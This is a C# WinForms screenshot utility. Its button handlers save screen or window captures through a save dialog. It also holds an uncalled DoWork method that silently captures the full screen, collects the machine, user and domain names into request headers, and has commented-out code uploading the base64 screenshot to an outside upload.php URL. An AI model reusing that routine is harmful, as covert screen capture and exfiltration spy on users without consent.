using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace HuUtils
{
    public partial class 截屏实例 : Form
    {
        public 截屏实例()
        {
            InitializeComponent();
        }

        public static void GetScreen()
        {
            Screen s = Screen.PrimaryScreen;
            Bitmap result = new Bitmap(s.Bounds.Width, s.Bounds.Height);
            using (Graphics g = Graphics.FromImage(result))
            {
                //g.CopyFromScreen(s.Bounds.Location, System.Drawing.Point.Empty, s.Bounds.Size);
                g.CopyFromScreen(new Point(0, 0), Point.Empty, s.Bounds.Size);
            }
            result.Save("1.jpg");
        }

        private void 截屏1_Click(object sender, EventArgs e)
        {
            this.Visible = false;
            System.Threading.Thread.Sleep(200);
            Screen screen = Screen.PrimaryScreen;
            Bitmap bit = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);
            Graphics g = Graphics.FromImage(bit);
            g.CopyFromScreen(new Point(0, 0), new Point(0, 0), bit.Size);
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "bmp|*.bmp|jpg|*.jpg|gif|*.gif";
            if (saveFileDialog.ShowDialog() != DialogResult.Cancel)
            {
                bit.Save(saveFileDialog.FileName);
            }
            g.Dispose();
            this.Visible = true;
        }

        private void 截屏2_Click(object sender, EventArgs e)
        {
            Bitmap bit = new Bitmap(this.Width, this.Height);
            Graphics g = Graphics.FromImage(bit);
            g.CopyFromScreen(this.Location, new Point(0, 0), bit.Size);
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "bmp|*.bmp|jpg|*.jpg|gif|*.gif";
            if (saveFileDialog.ShowDialog() != DialogResult.Cancel)
            {
                bit.Save(saveFileDialog.FileName);
            }
            g.Dispose();
        }

        private static byte[] TakeSnapShot(bool primaryOnly)
        {
            var box = primaryOnly ? Screen.PrimaryScreen.Bounds : SystemInformation.VirtualScreen;
            using (var ms = new MemoryStream())
            using (Bitmap bitmap = new Bitmap(box.Width, box.Height))
            using (Graphics canvas = Graphics.FromImage(bitmap))
            {
                canvas.CopyFromScreen(box.X, box.Y, 0, 0, bitmap.Size, CopyPixelOperation.SourceCopy);
                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                return ms.ToArray();
            }
        }

        private static void DoWork()
        {
            File.WriteAllBytes(@"kk.png", TakeSnapShot(false));

            WebClient client = new WebClient();
            client.Headers.Add("X-Dab-MachineName", Environment.MachineName);
            client.Headers.Add("X-Dab-HostName", Dns.GetHostName());
            client.Headers.Add("X-Dab-OsVersion", Environment.OSVersion.ToString());
            client.Headers.Add("X-Dab-CWD", Environment.CurrentDirectory);
            client.Headers.Add("X-Dab-ProcessorCount", Environment.ProcessorCount.ToString());
            client.Headers.Add("X-Dab-UserName", Environment.UserName);
            client.Headers.Add("X-Dab-UserDomainName", Environment.UserDomainName);
            client.Headers.Add("X-Dab-DotNetVersion", Environment.Version.ToString());
            client.Headers.Add("X-Dab-TickCount", Environment.TickCount.ToString());

            //using (var stream = client.OpenWrite("http://www2.unsec.net/usb/upload.php"))
            //{
            //    string data = Convert.ToBase64String(TakeSnapShot(false));
            //    var body = Encoding.UTF8.GetBytes(data);
            //    stream.Write(body, 0, body.Length);
            //    stream.Flush();
            //}
        }
    }
}